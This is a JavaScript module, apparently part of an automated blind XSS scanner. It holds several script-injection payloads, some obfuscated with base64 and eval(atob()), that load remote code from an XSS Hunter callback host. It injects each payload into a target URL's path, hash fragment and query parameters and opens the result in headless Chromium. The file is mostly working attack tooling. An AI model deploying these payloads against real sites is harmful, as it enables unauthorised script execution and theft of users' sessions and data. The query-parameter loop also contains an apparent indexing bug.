var cons = require('../constants.js')
var util = require('../utils.js')

var exploits = [
  '"><script src='+cons.xssHunter+'></script>',
  "javascript:eval('var a=document.createElement(\'script\');a.src=\'"+cons.xssHunter+"\';document.body.appendChild(a)')",
  '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbmFkaW5vLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>',
  '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbmFkaW5vLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>',
  '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "'+cons.xssHunter+'");a.send();</script>',
  '<script>$.getScript("'+cons.xssHunter+'")</script>'
]

async function fakebrowser(url){
  await new Promise(resolve => setTimeout(resolve, 2000));

  var spawnHeadlessChromium = require('run-headless-chromium').spawn;

  util.debug("XSS test for "+url)

  var proc = spawnHeadlessChromium([
      // Flags forwarded to Chromium:
      url,
  ], {
      stdio: 'inherit',
  });
  proc.on('close', function() {
      clearTimeout(delayedExit);
      console.log('Headless Chromium exited!');
  });
  var delayedExit = setTimeout(function() {
      console.log('Chrome did not exit within a few seconds, sending SIGINT...');
      // Graceful exit - allow run-headless-chromium to exit Chrome and Xvfb.
      proc.kill('SIGINT');
      // If you do proc.kill(); then Chrome and Xvfb may still hang around.
  }, 5000);
}

function pathCheck(url){
  var basepath = url.protocol+"//"+url.host+url.pathname+"/"

  exploits.forEach(ex => {
    fakebrowser(basepath+ex)
  })
}

function hashCheck(url){
  var basepath = url.href.split("#")[0]+"#"

  exploits.forEach(ex => {
    fakebrowser(basepath+ex)
  })
}

module.exports.test = function(urls){
  for(let item of urls.keys()) {

    hashCheck(item)
    pathCheck(item)

    if(item.search){
      if(!item.search.substring(1)) { continue }

      var arrayParams = item.search.substring(1).split("&")

      for(var i = 0; i < arrayParams.length; i++){
        var param = arrayParams[i]
        var key = param.split("=")[0]

        var basepath = item.protocol+"//"+item.host+item.pathname+"?"

        for(var j = 0; j < arrayParams.length; j++){

          if(i === j){continue}

          basepath += arrayParams[i] + "&"
        }

        basepath += key +"="

        exploits.forEach(ex => {
          fakebrowser(basepath+ex)
        })
      }
    }
  }
  return new Promise(function(resolve, reject){
    resolve("Done!")
  })
}
